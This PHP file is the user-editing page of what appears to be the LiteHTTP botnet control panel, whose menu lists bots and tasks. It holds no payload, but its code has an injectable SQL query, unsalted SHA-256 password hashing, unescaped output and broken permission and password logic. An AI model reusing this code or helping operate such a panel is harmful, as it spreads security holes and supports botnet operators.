<?php
$u = explode(":", $_SESSION['LiteHTTP']);
$username = $u[0];
$userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);

include 'inc/stats.php';
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Control Panel</title>
	<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
		<script src="js/respond.min.js"></script>
	<![endif]-->
</head>
<body class="wysihtml5-supported skin-black fixed">
	<header class="header">
		<a href="?p=main" class="logo">
			LiteHTTP
		</a>
		<nav class="navbar navbar-static-top" role="navigation">
			<div class="navbar-right">
				<ul class="nav navbar-nav">
					<li class="dropdown user user-menu">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown">
							<i class="glyphicon glyphicon-user"></i>
							<span><?php echo $username; ?> <i class="caret"></i></span>
						</a>
						<ul class="dropdown-menu">
							<li class="user-footer">
								<div class="pull-left">
									<a href="?p=account" class="btn btn-default btn-flat">Edit Account</a>
								</div>
								<div class="pull-right">
									<a href="?p=logout" class="btn btn-default btn-flat">Logout</a>
								</div>
							</li>
						</ul>
					</li>
				</ul>
			</div>
		</nav>
	</header>
	<div class="wrapper row-offcanvas row-offcanvas-left">
		<aside class="left-side sidebar-offcanvas">
			<section class="sidebar">
				<ul class="sidebar-menu">
					<li>
						<a href="?p=main">
							<i class="fa fa-dashboard"></i> <span>Dashboard</span>
						</a>
					</li>
					<li>
						<a href="?p=bots">
							<i class="fa fa-list"></i> <span>Bots</span>
							<small class="badge pull-right bg-green"><?php echo $online; ?></small>
						</a>
					</li>
					<li>
						<a href="?p=tasks">
							<i class="fa fa-bar-chart"></i> <span>Tasks</span>
						</a>
					</li>
					<li>
						<a href="?p=settings">
							<i class="fa fa-cog"></i> <span>Settings</span>
						</a>
					</li>
					<li class="active">
						<a href="?p=users">
							<i class="fa fa-users"></i> <span>Users</span>
						</a>
					</li>
					<li>
						<a href="?p=logs">
							<i class="fa fa-list-alt"></i> <span>Panel Logs</span>
						</a>
					</li>
					<li>
						<a href="?p=help">
							<i class="fa fa-question"></i> <span>Help</span>
						</a>
					</li>
				</ul>
			</section>
		</aside>
		<aside class="right-side">
			<section class="content">
				<div class="row">
					<div class="col-lg-12 col-xs-24">
						<?php
						if ($userperms == "user")
						{
							echo '<div class="alert alert-danger">You do not have permission to view this page.</div>';
							die();
						}
						if (!isset($_GET['id']))
						{
							echo '<div class="alert alert-danger">No ID provided. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=users">';
							die();
						}else{
							if (!ctype_digit($_GET['id']))
							{
								echo '<div class="alert alert-danger">ID was not a digit. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=users">';
								die();
							}
						}
						$uid = $_GET['id'];
						$cnt = $odb->prepare("SELECT COUNT(*) FROM users WHERE id = :i");
						$cnt->execute(array(":i" => $uid));
						if ($cnt->fetchColumn(0) == "0")
						{
							echo '<div class="alert alert-danger">User was not found in database. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=users">';
							die();
						}
						if ($uid == "1")
						{
							echo '<div class="alert alert-danger">This user cannot be modified. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=users">';
							die();
						}
						$uss = $odb->prepare("SELECT * FROM users WHERE id = :i");
						$uss->execute(array(":i" => $uid));
						$us = $uss->fetch(PDO::FETCH_ASSOC);
						if (isset($_POST['doEdit']))
						{
							$npass = $_POST['newpass'];
							$npcon = $_POST['newpass2'];
							$newpe = $_POST['perms'];
							$newst = $_POST['status'];
							if (empty($npass) || empty($npcon) || empty($newpe) || empty($newst))
							{
								echo '<div class="alert alert-danger">One of the fields were empty.</div>';
							}else{
								if ($npass == $npcon)
								{
									if (ctype_digit($newpe))
									{
										if (ctype_digit($newst))
										{
											$newperm = "";
											switch ($newpe)
											{
												case "1":
													$newperm = "user";
													break;
												case "2":
													$newperm = "moderator";
													break;
												case "3":
													$newperm = "admin";
													break;
											}
											if ($userperms == "moderator" && $us['privileges'] != "admin")
											{
												if ($npass != "" || $npass != NULL)
												{
													$hashed = hash("sha256", $npass);
													$up = $odb->prepare("UPDATE users SET password = :p, privileges = :pm, status = :s WHERE id = :i");
													$up->execute(array(":p" => $hashed, ":pm" => $newperm, ":s" => $newst, ":i" => $uid));
													$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
													$in->execute(array(":u" => $username, ":ip" => $_SESSION['REMOTE_ADDR'], ":r" => "Edited user ".$us['username']));
													echo '<div class="alert alert-success">Successfully updated user. Reloading...</div><meta http-equiv="refresh" content="2">';
												}else{
													$up = $odb->prepare("UPDATE users SET privileges = :p, status = :s WHERE id = :i");
													$up->execute(array(":p" => $newperm, ":s" => $newst, ":i" => $uid));
													$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
													$in->execute(array(":u" => $username, ":ip" => $_SESSION['REMOTE_ADDR'], ":r" => "Edited user ".$us['username']));
													echo '<div class="alert alert-success">Successfully updated user. Reloading...</div><meta http-equiv="refresh" content="2">';
												}
											}else{
												echo '<div class="alert alert-danger">You cannot edit administrative users.</div>';
											}
										}else{
											echo '<div class="alert alert-danger">Status was not a digit.</div>';
										}
									}else{
										echo '<div class="alert alert-danger">Permissions was not a digit.</div>';
									}
								}else{
									echo '<div class="alert alert-danger">Passwords did not match.</div>';
								}
							}
						}
						?>
					</div>
					<div class="col-lg-5 col-xs-10">
						<div class="nav-tabs-custom">
							<div class="tab-content">
								<a href="?p=users"><i class="fa fa-arrow-left"></i> Go Back</a>
								<center><h4>Editing user <b><?php echo $us['username']; ?></b></h4></center>
								<br>
								<form action="" method="POST" class="col-lg-8">
									<label>New Password</label>
									<input type="password" class="form-control" name="newpass" placeholder="Leave blank for old password">
									<br>
									<label>New Password Confirm</label>
									<input type="password" class="form-control" name="newpass2" placeholder="Leave blank for old password">
									<br>
									<label>Permissions</label>
									<select class="form-control" name="perms">
										<?php
										switch ($us['privileges'])
										{
											case "user":
												echo '<option value="1" selected>User</option><option value="2">Moderator</option><option value="3">Admin</option>';
												break;
											case "moderator":
												echo '<option value="1">User</option><option value="2" selected>Moderator</option><option value="3">Admin</option>';
												break;
											case "admin":
												echo '<option value="1">User</option><option value="2">Moderator</option><option value="3" selected>Admin</option>';
												break;
										}
										?>
									</select>
									<br>
									<label>Status</label>
									<select class="form-control" name="status">
										<?php
										if ($us['status'] == "1")
										{
											echo '<option value="1" selected>Active</option><option value="2">Banned</option>';
										}else{
											echo '<option value="1">Active</option><option value="2" selected>Banned</option>';
										}
										?>
									</select>
									<br>
									<center><input type="submit" class="btn btn-success" name="doEdit" value="Edit User"></center>
								</form>
								<div class="clearfix"></div>
							</div>
						</div>
					</div>
				</div>
			</section>
		</aside>
	</div>
	<script src="js/jquery.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/jquery-ui.min.js" type="text/javascript"></script>
</body>
</html>